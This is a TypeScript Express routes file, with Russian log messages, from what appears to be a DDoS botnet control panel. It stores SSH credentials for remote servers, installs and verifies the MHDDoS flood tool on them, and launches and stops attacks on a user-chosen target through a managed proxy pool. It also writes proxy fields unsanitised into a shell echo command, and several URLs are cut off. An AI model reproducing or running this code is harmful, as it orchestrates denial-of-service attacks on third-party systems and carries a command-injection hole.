import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { setupAuth } from "./auth";
import { storage } from "./storage";
import { insertServerSchema, insertAttackSchema, insertProxySchema } from "@shared/schema";
import { setupServer, startAttack, stopAttack } from "./services/server-setup";
import fetch from "node-fetch";
import multer from "multer";
import { Client } from "ssh2";
import { HttpsProxyAgent } from "https-proxy-agent";
async function executeCommand(conn: any, command: string): Promise<string> {
  return new Promise((resolve, reject) => {
    conn.exec(command, (err: any, stream: any) => {
      if (err) return reject(err);
      let stdout = '';
      let stderr = '';
      stream.on('data', (data: any) => {
        stdout += data.toString();
      });
      stream.stderr.on('data', (data: any) => {
        stderr += data.toString();
        console.log('[DEBUG] STDERR в routes: ' + data.toString());
      });
      stream.on('close', (code: number) => {
        if (code !== 0) {
          console.log(`[DEBUG] Command exited with code ${code} в routes`);
        }
        resolve(stdout);
      });
    });
  });
}
const upload = multer();
function isAuthenticated(req: any, res: any, next: any) {
  if (req.isAuthenticated()) {
    return next();
  }
  res.status(401).json({ message: "Требуется авторизация" });
}
export async function registerRoutes(app: Express): Promise<Server> {
  setupAuth(app);
  const httpServer = createServer(app);
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  wss.on('connection', (ws) => {
    console.log('[DEBUG] New WebSocket connection established');
    ws.on('message', (message) => {
      try {
        const data = JSON.parse(message.toString());
        console.log('[DEBUG] WebSocket message received:', data);
        if (data.type === 'getStatus') {
          console.log('[DEBUG] Отправка обновления статуса');
          ws.send(JSON.stringify({
            type: 'statusUpdate',
            data: { status: 'connected' }
          }));
        }
      } catch (error) {
        console.error('[DEBUG] Ошибка обработки сообщения WebSocket:', error);
      }
    });
    ws.on('error', (error) => {
      console.error('[DEBUG] WebSocket error:', error);
    });
    ws.on('close', (code, reason) => {
      console.log(`[DEBUG] WebSocket соединение закрыто. Код: ${code}, Причина: ${reason}`);
    });
    ws.send(JSON.stringify({
      type: 'connected',
      data: { timestamp: new Date().toISOString() }
    }));
  });
  wss.on('error', (error) => {
    console.error('[DEBUG] WebSocket Server Error:', error);
  });
  app.get("/api/servers", isAuthenticated, async (req, res) => {
    const servers = await storage.getServers();
    res.json(servers);
  });
  app.post("/api/servers", isAuthenticated, async (req, res) => {
    try {
      const result = insertServerSchema.safeParse(req.body);
      if (!result.success) {
        return res.status(400).json({ errors: result.error.errors });
      }
      const server = await storage.createServer(result.data);
      await setupServer(server);
      await storage.updateServerStatus(server.id, "online");
      res.status(201).json(server);
    } catch (error) {
      console.error("Ошибка при добавлении сервера:", error);
      res.status(500).json({ message: "Ошибка при настройке сервера" });
    }
  });
  app.delete("/api/servers/:id", isAuthenticated, async (req, res) => {
    await storage.deleteServer(parseInt(req.params.id));
    res.sendStatus(200);
  });
  app.get("/api/attacks", isAuthenticated, async (req, res) => {
    const attacks = await storage.getAttacks();
    res.json(attacks);
  });
  app.post("/api/attacks", isAuthenticated, async (req, res) => {
    try {
      const result = insertAttackSchema.safeParse(req.body);
      if (!result.success) {
        return res.status(400).json({ errors: result.error.errors });
      }
      const attack = await storage.createAttack(result.data);
      const serverIds = attack.serverIds.split(',').map(id => parseInt(id));
      const servers = await Promise.all(serverIds.map(id => storage.getServer(id)));
      if (servers.filter(Boolean).length === 0) {
        return res.status(400).json({ message: "Не найдены указанные серверы" });
      }
      const command = `${attack.method} ${attack.target} ${attack.threads} ${attack.rpc}`;
      console.log(`[DEBUG] Запуск атаки: ${command} на серверах: ${serverIds.join(',')}`);
      console.log(`[DEBUG] Детали атаки: метод=${attack.method}, цель=${attack.target}, потоки=${attack.threads}, rpc=${attack.rpc}`);
      for (const server of servers) {
        if (server) {
          try {
            console.log(`[DEBUG] Проверка состояния сервера перед атакой: ${server.id} (${server.name}) - ${server.host}:${server.port}`);
            const conn = new Client();
            await new Promise<void>((resolve, reject) => {
              conn.on('ready', () => {
                resolve();
              }).on('error', (err) => {
                reject(err);
              }).connect({
                host: server.host,
                port: server.port,
                username: server.username,
                password: server.password
              });
            });
            const checkMHDDoS = await executeCommand(conn, 'ls -la /root/MHDDoS/start.py || echo "Файл не найден"');
            console.log(`[DEBUG] Проверка MHDDoS: ${checkMHDDoS}`);
            if (checkMHDDoS.includes("Файл не найден")) {
              console.log(`[DEBUG] Переустановка MHDDoS на сервере ${server.id}...`);
              await setupServer(server);
            } else {
              console.log(`[DEBUG] Проверка работоспособности MHDDoS на сервере ${server.id}...`);
              try {
                const testCommand = await executeCommand(conn, 'cd /root/MHDDoS && python3 start.py --help | head -n 5');
                console.log(`[DEBUG] Тест MHDDoS: ${testCommand}`);
                console.log(`[DEBUG] Проверка зависимостей Python на сервере ${server.id}...`);
                const pipList = await executeCommand(conn, 'pip3.10 list | grep -E "yarl|aiohttp|socks|requests"');
                console.log(`[DEBUG] Установленные пакеты: ${pipList}`);
                if (!pipList.includes('yarl') || !pipList.includes('aiohttp')) {
                  console.log(`[DEBUG] Установка недостающих зависимостей на сервере ${server.id}...`);
                  await executeCommand(conn, 'cd /root/MHDDoS && pip3 install -r requirements.txt');
                }
                if (!pipList.includes('yarl') || !pipList.includes('aiohttp') || !pipList.includes('requests')) {
                  console.log(`[DEBUG] Установка основных зависимостей MHDDoS...`);
                  await executeCommand(conn, 'cd /root/MHDDoS && pip3 install -r requirements.txt');
                }
                console.log(`[DEBUG] Проверка установки Python 3.10...`);
                const pythonCheck = await executeCommand(conn, 'python3.10 --version || echo "Python 3.10 не установлен"');
                console.log(`[DEBUG] Версия Python: ${pythonCheck}`);
                if (pythonCheck.includes('не установлен')) {
                  console.log(`[DEBUG] Установка Python 3.10...`);
                  await executeCommand(conn, 'apt update && apt install -y python3.10 python3.10-pip || apt install -y python3.10 python3.10-pip');
                }
                console.log(`[DEBUG] Проверка доступности PyRoxy...`);
                const pyroxyCheck = await executeCommand(conn, 'cd /root/MHDDoS && python3.10 -c "try: import PyRoxy; print(\'PyRoxy доступен\'); except Exception as e: print(\'PyRoxy недоступен: \' + str(e))"');
                console.log(`[DEBUG] Результат проверки PyRoxy: ${pyroxyCheck}`);
                if (pyroxyCheck.includes('PyRoxy недоступен')) {
                  console.log(`[DEBUG] PyRoxy недоступен, устанавливаем вручную...`);
                  await executeCommand(conn, 'rm -rf /root/PyRoxy || true');
                  await executeCommand(conn, 'git clone https:
                  await executeCommand(conn, 'cp -r /root/PyRoxy/PyRoxy /root/MHDDoS/');
                  await executeCommand(conn, 'cd /root/PyRoxy && python3.10 -m pip install -r requirements.txt');
                  await executeCommand(conn, 'cd /root/MHDDoS && python3.10 -m pip install -r requirements.txt');
                }
              } catch (error) {
                console.error(`[DEBUG] Ошибка при проверке MHDDoS: ${error}`);
                console.log(`[DEBUG] Переустановка MHDDoS на сервере ${server.id}...`);
                await setupServer(server);
              }
            }
            conn.end();
          } catch (err) {
            console.error(`[DEBUG] Ошибка при проверке сервера ${server.id}:`, err);
          }
        }
      }
      for (const server of servers) {
        if (server) {
          try {
            console.log(`[DEBUG] Запуск атаки на сервере ${server.id} (${server.name}) - ${server.host}:${server.port}`);
            await startAttack(
              server, 
              command, 
              attack.layer, 
              attack.method, 
              attack.target, 
              attack.threads, 
              attack.rpc, 
              attack.duration, 
              attack.useProxy
            );
            console.log(`[DEBUG] Атака запущена на сервере ${server.id} (${server.name})`);
            try {
              const conn = new Client();
              await new Promise<void>((resolve, reject) => {
                conn.on('ready', () => {
                  resolve();
                }).on('error', (err) => {
                  reject(err);
                }).connect({
                  host: server.host,
                  port: server.port,
                  username: server.username,
                  password: server.password
                });
              });
              console.log(`[DEBUG] Проверка ресурсов на сервере ${server.name}`);
              const checkDiskSpace = await executeCommand(conn, 'df -h');
              console.log(`[DEBUG] Дисковое пространство: ${checkDiskSpace}`);
              const checkMemory = await executeCommand(conn, 'free -m');
              console.log(`[DEBUG] Оперативная память: ${checkMemory}`);
              const checkCPU = await executeCommand(conn, 'top -bn1 | head -20');
              console.log(`[DEBUG] Загрузка CPU: ${checkCPU}`);
              conn.end();
            } catch (error) {
              console.error(`[DEBUG] Ошибка при проверке сервера: ${error}`);
            }
          } catch (err) {
            console.error(`[DEBUG] Ошибка при запуске атаки на сервере ${server.id}:`, err);
          }
        }
      }
      await storage.updateAttackStatus(attack.id, "running");
      wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({
            type: 'attackStarted',
            data: attack
          }));
        }
      });
      res.status(201).json(attack);
    } catch (error) {
      console.error("Ошибка при запуске атаки:", error);
      res.status(500).json({ message: "Ошибка при запуске атаки" });
    }
  });
  app.post("/api/attacks/:id/stop", isAuthenticated, async (req, res) => {
    try {
      const attack = await storage.getAttack(parseInt(req.params.id));
      if (!attack) {
        return res.status(404).json({ message: "Атака не найдена" });
      }
      const serverIds = attack.serverIds.split(',').map(id => parseInt(id));
      const servers = await Promise.all(serverIds.map(id => storage.getServer(id)));
      console.log(`Остановка атаки ID: ${attack.id} на серверах: ${serverIds.join(',')}`);
      for (const server of servers) {
        if (server) {
          try {
            await stopAttack(server);
            console.log(`Атака остановлена на сервере ${server.id} (${server.name})`);
          } catch (err) {
            console.error(`Ошибка при остановке атаки на сервере ${server.id}:`, err);
          }
        }
      }
      await storage.updateAttackStatus(attack.id, "stopped");
      wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({
            type: 'attackStopped',
            data: attack
          }));
        }
      });
      res.json({ message: "Атака остановлена", success: true });
    } catch (error) {
      console.error("Ошибка при остановке атаки:", error);
      res.status(500).json({ message: "Ошибка при остановке атаки" });
    }
  });
  app.get("/api/proxies", isAuthenticated, async (req, res) => {
    const proxies = await storage.getProxies();
    res.json(proxies);
  });
  app.post("/api/proxies", isAuthenticated, async (req, res) => {
    try {
      const result = insertProxySchema.safeParse(req.body);
      if (!result.success) {
        return res.status(400).json({ errors: result.error.errors });
      }
      const proxy = await storage.createProxy(result.data);
      setTimeout(async () => {
        try {
          const servers = await storage.getServers();
          if (servers.length > 0) {
            const server = servers[0];
            const conn = new Client();
            await new Promise<void>((resolve, reject) => {
              conn.on('ready', () => {
                resolve();
              }).on('error', (err) => {
                reject(err);
              }).connect({
                host: server.host,
                port: server.port,
                username: server.username,
                password: server.password
              });
            });
            const proxyLine = `${proxy.host}:${proxy.port}${proxy.username && proxy.password ? `:${proxy.username}:${proxy.password}` : ''}`;
            const scriptName = `/tmp/quick_check_${Date.now()}.py`;
            const script = `
import socket
import time
import json
def quick_check(proxy_str, timeout=0.5):
    try:
        parts = proxy_str.split(':')
        host = parts[0]
        port = int(parts[1])
        # Попытка соединиться с прокси
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        start_time = time.time()
        s.connect((host, port))
        response_time = (time.time() - start_time) * 1000
        s.close()
        print(json.dumps({
            "status": "working",
            "response_time": int(response_time)
        }))
        return True
    except Exception as e:
        print(json.dumps({
            "status": "failed",
            "error": str(e)
        }))
        return False
quick_check("${proxyLine}")
`;
            await executeCommand(conn, `echo '${script}' > ${scriptName}`);
            const result = await executeCommand(conn, `python3 ${scriptName}`);
            try {
              const parsedResult = JSON.parse(result.trim());
              await storage.updateProxyStatus(proxy.id, parsedResult.status === "working" ? "active" : "inactive");
              wss.clients.forEach((client) => {
                if (client.readyState === WebSocket.OPEN) {
                  client.send(JSON.stringify({
                    type: 'proxyChecked',
                    data: {
                      proxy: {
                        id: proxy.id,
                        host: proxy.host,
                        port: proxy.port,
                        status: parsedResult.status
                      },
                      result: parsedResult
                    }
                  }));
                }
              });
            } catch (err) {
              console.error('[DEBUG] Ошибка при обработке результата автоматической проверки прокси:', err);
            }
            await executeCommand(conn, `rm -f ${scriptName}`);
            conn.end();
          }
        } catch (err) {
          console.error('[DEBUG] Ошибка при автоматической проверке прокси:', err);
        }
      }, 100); 
      res.status(201).json(proxy);
    } catch (error) {
      console.error("Ошибка при добавлении прокси:", error);
      res.status(500).json({ message: "Ошибка при добавлении прокси" });
    }
  });
  let isProxyCheckRunning = false;
  app.post("/api/proxies/check", isAuthenticated, async (req, res) => {
    try {
      if (isProxyCheckRunning) {
        return res.status(409).json({ message: "Проверка прокси уже запущена" });
      }
      isProxyCheckRunning = true;
      const proxies = await storage.getProxies();
      if (proxies.length === 0) {
        isProxyCheckRunning = false;
        return res.status(400).json({ message: "Список прокси пуст" });
      }
      console.log(`[DEBUG] Начинаем проверку ${proxies.length} прокси`);
      const maxResponseTime = req.body.maxResponseTime || 500;
      console.log(`[DEBUG] Максимальное время отклика установлено на ${maxResponseTime} мс`);
      const checkId = Date.now().toString();
      wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({
            type: 'proxyCheckStarted',
            data: {
              id: checkId,
              total: proxies.length,
              checked: 0,
              working: 0,
              failed: 0,
              maxResponseTime
            }
          }));
        }
      });
      let progress = { 
        checked: 0, 
        working: 0, 
        failed: 0,
        speed: 0,
        startTime: Date.now(),
        maxResponseTime
      };
      const updateProgress = (data: { checked: number, working: number, failed: number }) => {
        progress.checked += data.checked;
        progress.working += data.working;
        progress.failed += data.failed;
        const elapsedTime = (Date.now() - progress.startTime) / 1000;
        progress.speed = Math.round(progress.checked / (elapsedTime || 1)); 
        wss.clients.forEach((client) => {
          if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({
              type: 'proxyCheckProgress',
              data: {
                id: checkId,
                total: proxies.length,
                ...progress
              }
            }));
          }
        });
      };
      const progressInterval = setInterval(() => {
        wss.clients.forEach((client) => {
          if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({
              type: 'proxyCheckProgress',
              data: {
                id: checkId,
                total: proxies.length,
                ...progress
              }
            }));
          }
        });
      }, 1000);
      const chunks = [];
      const chunkSize = 20; 
      for (let i = 0; i < proxies.length; i += chunkSize) {
        chunks.push(proxies.slice(i, i + chunkSize));
      }
      res.json({ 
        message: "Проверка запущена", 
        id: checkId,
        total: proxies.length,
        maxResponseTime
      });
      const checkProxy = (proxy: any): Promise<{ proxy: any, working: boolean, responseTime?: number, error?: string }> => {
        return new Promise((resolve) => {
          const proxyUrl = `http:
          const proxyAuth = proxy.username && proxy.password 
            ? `${proxy.username}:${proxy.password}@` 
            : '';
          const fullProxyUrl = proxy.username && proxy.password 
            ? `http:
            : proxyUrl;
          const timeoutValue = maxResponseTime + 200;
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), timeoutValue);
          const testUrl = "https:
          const startTime = performance.now();
          fetch(testUrl, {
            signal: controller.signal,
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            },
            agent: new HttpsProxyAgent(fullProxyUrl)
          })
          .then(response => {
            clearTimeout(timeoutId);
            const responseTime = Math.round(performance.now() - startTime);
            const isResponseTimeOk = responseTime <= maxResponseTime;
            resolve({ 
              proxy, 
              working: response.status === 200 && isResponseTimeOk, 
              responseTime 
            });
          })
          .catch(error => {
            clearTimeout(timeoutId);
            resolve({ 
              proxy, 
              working: false, 
              error: error.message 
            });
          });
        });
      };
      (async () => {
        try {
          const proxyResults = [];
          const batchSize = 50; 
          const concurrentBatches = 5; 
          for (let i = 0; i < chunks.length; i += concurrentBatches) {
            const batchChunks = chunks.slice(i, i + concurrentBatches);
            const batchPromises = batchChunks.map(chunk => Promise.all(chunk.map(checkProxy)));
            const batchResults = await Promise.all(batchPromises);
            const chunkResults = batchResults.flat();
            for (const result of chunkResults) {
              const status = result.working ? "active" : "inactive";
              await storage.updateProxyStatus(result.proxy.id, status);
              if (!result.working) {
                await storage.markProxyForDeletion(result.proxy.id);
              }
              if (result.responseTime) {
                await storage.updateProxyResponseTime(result.proxy.id, result.responseTime);
              }
              proxyResults.push(result);
              updateProgress({
                checked: 1,
                working: result.working ? 1 : 0,
                failed: result.working ? 0 : 1
              });
            }
          }
          const proxiesToDelete = await storage.getProxiesMarkedForDeletion();
          for (const proxy of proxiesToDelete) {
            await storage.deleteProxy(proxy.id);
          }
          clearInterval(progressInterval);
          wss.clients.forEach((client) => {
            if (client.readyState === WebSocket.OPEN) {
              client.send(JSON.stringify({
                type: 'proxyCheckCompleted',
                data: {
                  id: checkId,
                  total: proxies.length,
                  checked: progress.checked,
                  working: progress.working,
                  failed: progress.failed,
                  deletedCount: proxiesToDelete.length,
                  maxResponseTime
                }
              }));
            }
          });
        } catch (error) {
          console.error('[DEBUG] Ошибка при проверке прокси:', error);
        }
        isProxyCheckRunning = false; 
      })();
    } catch (error) {
      console.error('[DEBUG] Ошибка при инициализации проверки прокси:', error);
      isProxyCheckRunning = false; 
      res.status(500).json({ message: "Ошибка при проверке прокси" });
    }
  });
  app.post("/api/proxies/load-url", isAuthenticated, async (req, res) => {
    try {
      const { url } = req.body;
      const response = await fetch(url);
      const text = await response.text();
      const lines = text.split('\n');
      for (const line of lines) {
        const proxyLine = line.trim();
        if (!proxyLine) continue;
        try {
          const parts = proxyLine.split(':');
          if (parts.length >= 2) {
            const host = parts[0];
            const port = parseInt(parts[1]);
            const username = parts.length > 2 ? parts[2] : undefined;
            const password = parts.length > 3 ? parts[3] : undefined;
            if (host && port) {
              await storage.createProxy({
                type: "HTTP", 
                host,
                port,
                username,
                password,
              });
            }
          }
        } catch (error) {
          console.error(`Ошибка при обработке строки ${proxyLine}:`, error);
          continue;
        }
      }
      res.json({ message: "Прокси успешно загружены" });
    } catch (error) {
      console.error("Ошибка при загрузке прокси:", error);
      res.status(500).json({ message: "Ошибка при загрузке прокси" });
    }
  });
  app.post("/api/proxies/upload", isAuthenticated, upload.single('file'), async (req, res) => {
    try {
      const file = req.file;
      if (!file) {
        return res.status(400).json({ message: "Файл не найден" });
      }
      const text = file.buffer.toString('utf-8');
      const lines = text.split('\n');
      for (const line of lines) {
        const [type, host, port] = line.trim().split(':');
        if (type && host && port) {
          await storage.createProxy({
            type: type.toUpperCase(),
            host,
            port: parseInt(port),
          });
        }
      }
      res.json({ message: "Прокси успешно загружены" });
    } catch (error) {
      res.status(500).json({ message: "Ошибка при загрузке прокси" });
    }
  });
  app.post("/api/proxies/:id/check", isAuthenticated, async (req, res) => {
    try {
      const proxyId = parseInt(req.params.id);
      const proxy = await storage.getProxy(proxyId);
      if (!proxy) {
        return res.status(404).json({ message: "Прокси не найден" });
      }
      const maxResponseTime = req.body.maxResponseTime || 500;
      const proxyUrl = `http:
      const proxyAuth = proxy.username && proxy.password 
        ? `${proxy.username}:${proxy.password}@` 
        : '';
      const fullProxyUrl = proxy.username && proxy.password 
        ? `http:
        : proxyUrl;
      console.log(`[DEBUG] Проверка прокси: ${proxy.host}:${proxy.port} (макс. время отклика: ${maxResponseTime}мс)`);
      try {
        const controller = new AbortController();
        const timeoutValue = maxResponseTime + 200;
        const timeoutId = setTimeout(() => controller.abort(), timeoutValue);
        const startTime = performance.now();
        const testUrl = "https:
        const response = await fetch(testUrl, {
          signal: controller.signal,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
          },
          agent: new HttpsProxyAgent(fullProxyUrl)
        });
        clearTimeout(timeoutId);
        const responseTime = Math.round(performance.now() - startTime);
        const isWorking = response.status === 200 && responseTime <= maxResponseTime;
        console.log(`[DEBUG] Результат проверки прокси ${proxy.host}:${proxy.port}: статус=${response.status}, время=${responseTime}мс, работает=${isWorking}`);
        await storage.updateProxyStatus(proxyId, isWorking ? "active" : "inactive");
        await storage.updateProxyResponseTime(proxyId, responseTime);
        if (!isWorking && req.query.autoDelete === "true") {
          await storage.deleteProxy(proxyId);
        }
        const resultData = {
          proxy: `${proxy.host}:${proxy.port}`,
          status: isWorking ? "working" : "failed",
          responseTime: responseTime,
          maxResponseTime: maxResponseTime,
          statusCode: response.status
        };
        res.json({
          success: true,
          proxyId,
          result: resultData
        });
      } catch (error) {
        console.log(`[DEBUG] Ошибка при проверке прокси ${proxy.host}:${proxy.port}: ${error}`);
        await storage.updateProxyStatus(proxyId, "inactive");
        if (req.query.autoDelete === "true") {
          await storage.deleteProxy(proxyId);
        }
        const resultData = {
          proxy: `${proxy.host}:${proxy.port}`,
          status: "failed",
          error: error.message,
          maxResponseTime: maxResponseTime
        };
        res.json({
          success: false,
          proxyId,
          result: resultData
        });
      }
    } catch (error) {
      console.error('[DEBUG] Ошибка при проверке прокси:', error);
      res.status(500).json({ message: "Ошибка при проверке прокси" });
    }
  });
  app.delete("/api/proxies/:id", isAuthenticated, async (req, res) => {
    await storage.deleteProxy(parseInt(req.params.id));
    res.sendStatus(200);
  });
  app.post("/api/settings/credentials", isAuthenticated, async (req, res) => {
    try {
      const { username, password } = req.body;
      if (!username || !password) {
        return res.status(400).json({ message: "Укажите новый логин и пароль" });
      }
      const user = await storage.updateUser(req.user.id, { username, password });
      res.json(user);
    } catch (error) {
      console.error("Ошибка при обновлении учетных данных:", error);
      res.status(500).json({ message: "Ошибка при обновлении учетных данных" });
    }
  });
  return httpServer;
}